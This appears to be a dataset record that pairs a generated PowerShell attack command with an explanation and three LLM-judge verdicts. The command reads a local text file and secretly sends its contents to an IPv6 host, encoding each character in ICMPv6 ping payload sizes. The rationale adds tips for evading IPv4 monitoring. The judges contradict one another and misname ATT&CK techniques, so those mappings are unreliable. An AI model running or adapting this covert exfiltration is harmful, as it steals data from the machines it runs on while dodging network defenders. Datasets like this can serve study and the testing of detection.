command: $d='fd00:0:be:ef::42'; $lines=Get-Content 'C:\Users\Public\message.txt'; foreach($line in $lines){ Test-Connection -ComputerName $d -Count 1 -BufferSize 900 -IPv6 -Quiet | Out-Null; $line.ToCharArray() | ForEach-Object { Test-Connection -ComputerName $d -Count 1 -BufferSize (900 + [byte][char]$_) -IPv6 -Quiet | Out-Null } }
explanation: Frames text exfiltration over ICMPv6 by sending a start-of-line marker payload size followed by per-character payload sizes, using ICMPv6 as the alternate medium per T1011.
rationale_steps: Iterate lines, emitting a fixed-size sync marker for each line.
Encode each character into the ICMP payload size with a known base.
Use IPv6 addressing to avoid commonly monitored IPv4 channels.

llm_judgments.syntactic_justification: The PowerShell command is perfectly well-formed with proper variable declarations, balanced parentheses/braces, correct method calls, and appropriate pipeline operators.
llm_judgments.semantic_justification: While the command does implement data exfiltration over ICMPv6 as claimed, it doesn't align with T1011 (Exfiltration Over Other Network Medium) rather than T1055 (Modify System Image) as described in the technique description.

llm_judgments.syntactic_justification: The PowerShell command is perfectly well-formed with balanced quotes, valid variable assignments, correct loop structures, and proper command flags for `Test-Connection` and `Get-Content`.
llm_judgments.semantic_justification: The command performs ICMPv6-based data exfiltration by encoding data in packet buffer sizes, which is entirely unrelated to MITRE ATT&CK T1011 (Modify System Image) and does not achieve its stated goal of modifying an OS/firmware image.

llm_judgments.syntactic_justification: The PowerShell one-liner uses balanced quotes/braces, valid Test-Connection parameters (-ComputerName, -Count, -BufferSize, -IPv6, -Quiet), and proper separators, so it should parse and run.
llm_judgments.semantic_justification: Although it plausibly exfiltrates text via ICMPv6, this does not modify a system image or firmware as described, so it is not aligned with the stated technique.
